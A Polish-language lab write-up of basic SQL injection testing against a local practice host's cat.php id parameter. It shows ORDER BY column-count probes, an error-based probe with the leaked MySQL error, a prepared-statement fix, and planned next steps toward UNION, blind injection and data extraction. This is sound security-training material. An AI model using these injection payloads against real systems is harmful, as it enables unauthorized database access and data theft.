
# SQL Injection – Podstawy

## Cel testów
Identyfikacja i weryfikacja podatności SQL Injection w parametrze `id` endpointu `cat.php`.

## Wykonanie

### Testowanie liczby kolumn (ORDER BY)

```
http://192.168.56.6/cat.php?id=1 order by 1
http://192.168.56.6/cat.php?id=1 order by 2
http://192.168.56.6/cat.php?id=1 order by 3
http://192.168.56.6/cat.php?id=1 order by 4
http://192.168.56.6/cat.php?id=1 order by 5
```

![order by test](../img/image.png)

Przy `order by 5` pojawia się błąd SQL, co wskazuje, że zapytanie posiada **4 kolumny**.

### Testowanie błędu SQL (Error-based detection)

```
http://192.168.56.6/cat.php?id=1 dowolny string
```

Odpowiedź serwera:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dowolny string' at line 1
```

**Wnioski:**
- Parametr `id` jest wstrzykiwany bezpośrednio do zapytania SQL
- Aplikacja nie sanitizuje wejścia i nie używa prepared statements
- Błędy SQL są ujawniane w odpowiedzi HTTP (Information Disclosure)

### Testowanie undefined index

```
http://192.168.56.6/cat.php?dowolny%20string%20id=1
```

![undefined index](../img/image.png)

Aplikacja oczekuje konkretnego parametru `id` i nie obsługuje zmiennych parametrów — dodatkowy symptom słabej walidacji.

## Analiza podatności

### Brak proper prepared statements

Serwer wykorzystuje:
```php
query = "SELECT * FROM users WHERE name = '" + userInput + "';"
```

Zamiast:
```php
query = "SELECT * FROM users WHERE name = ?"
prepare(query)
bind(1, userInput)
execute()
```

**Ryzyko:** Pełna kompromitacja bazy danych.

---

## Podsumowanie i następne kroki

**Zidentyfikowane podatności:**
1. Brak sanitizacji wejścia
2. Brak prepared statements
3. Information disclosure (błędy SQL)
4. Zapytanie zawiera 4 kolumny

**Następne testy:**
- Automatyczne skanowanie (SQLMap)
- Zaawansowane techniki (UNION SELECT, blind SQLi)
- Enumeracja i ekstrakcja danych
